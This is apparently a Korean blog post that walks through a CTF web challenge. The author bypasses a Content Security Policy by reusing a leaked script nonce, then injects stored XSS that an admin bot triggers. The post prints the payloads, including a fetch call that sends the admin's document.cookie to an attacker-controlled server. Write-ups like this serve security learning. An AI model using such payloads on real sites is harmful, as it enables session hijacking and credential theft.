---
layout: post
title: "Falling Slowly... Again"
image: GR1.png
date: 2025-09-17 14:55:00 +0900
tags: [web, hacking, google]
categories: web
---

Google Beginner's Request

Falling Slowly... Again

***

**Google Beginner's Request - Falling Slowly... Again**

![]({{site.baseurl}}/images/GoogleRequest/FSA/1.png)

HTTPS://once-web.2024-BQ.ctfcompetition.com

`This site boasts a defense against XSS, but its security is like a falling leaf – slow and predictable. It relies on a mechanism that, while sound in theory, has a fatal flaw in its execution. Can you exploit this weakness to inject your own malicious code and take control?`

이 사이트는 XSS 방어 기능을 자랑하지만, 보안은 마치 떨어지는 나뭇잎처럼 느리고 예측 가능합니다. 이론적으로는 안전하지만 실행에 치명적인 결함이 있는 메커니즘을 사용합니다. 이 취약점을 악용하여 악성 코드를 삽입하고 시스템을 장악할 수 있을까요?


![]({{site.baseurl}}/images/GoogleRequest/FSA/2.png)

들어가면 name과 admin에게 전송할 링크를 입력받는다.

name의 경우, Digital_Phantom란에 입력한 값이 적히는 방식이다.

admin에 전송할 링크 전송 시 admin이 그 링크로 이동하는 시스템이다.

따라서

1. name에 XSS를 삽입한다.
2. admin에게 링크를 전송한다.
3. 링크를 클릭한 admin의 document.cookie를 탈취한다.

이렇게 전개하면 될 거 같다.


![]({{site.baseurl}}/images/GoogleRequest/FSA/3.png)

우선적으로 간단한 스크립트문을 삽입하여준다.


![]({{site.baseurl}}/images/GoogleRequest/FSA/4.png)

삽입 후 확인 시 CSP 정책에 의해 막히는 걸 볼 수 있다.

CSP의 경우는 보통 요청 값이나 응답 값에 노출되는 경우가 있다.


![]({{site.baseurl}}/images/GoogleRequest/FSA/5.png)

/favicon.ico의 패킷 확인 시 응답 값에서 CSP를 확인할 수 있으며

하단의 Style의 경우, nonce="b04ppxGUAjltHc4UXpjG6ggg"를 사용하여 CSP 정책을 통과하는 것을 볼 수 있다.


따라서 스크립트 문에 nonce="b04ppxGUAjltHc4UXpjG6ggg"를 삽입하여

작성 시 CSP 정책을 우회할 수 있을 것이다.


![]({{site.baseurl}}/images/GoogleRequest/FSA/6.png)

아까와 같이 스크립트를 삽입한다.
삽입한 구문은 
{% highlight js %}
<script nonce="b04ppxGUAjltHc4UXpjG6ggg">alert(1)</script>
{% endhighlight %}
으로 CSP 정책을 우회하게끔 작성하였다.


![]({{site.baseurl}}/images/GoogleRequest/FSA/7.png)

작성된 구문으로 요청 값을 보낼 시 예상과 같이 스크립트 문이 실행된다.
이를 통해 CSP를 우회한 스크립트문을 삽입할 수 있다.


![]({{site.baseurl}}/images/GoogleRequest/FSA/8.png)

name값에 악성 스크립트문을 작성하여 요청을 보낼 경우, 공격자의 서버로 전송이 되었다.

{% highlight js %}
<script nonce="bO4ppxGUAjltHc4UXpjG6ggg">fetch('[주소]?flag='+document.cookie)</script>
{% endhighlight %}

ADMIN에게 name에 스크립트문 삽입한 URL을 보낼 경우 admin의 document.cookie값을 알아낼 수 있다.


![]({{site.baseurl}}/images/GoogleRequest/FSA/9.png)

FLAG 획득 완료

**시행착오**

두 달간 못풀었던 문제이다.

CSP 우회하는 방법은 알아냈는데, 

ADMIN에게 보내는 방법을 몰라 헤맸다.

화나는 점은 그냥 name에 스크립트문 삽입한 걸 admin에 전송하면 되는건데

그걸 헤매서 삽집하다 두 달이나 걸렸다.

### 99% 풀어놓고 하이고 하이고오!!!!!!
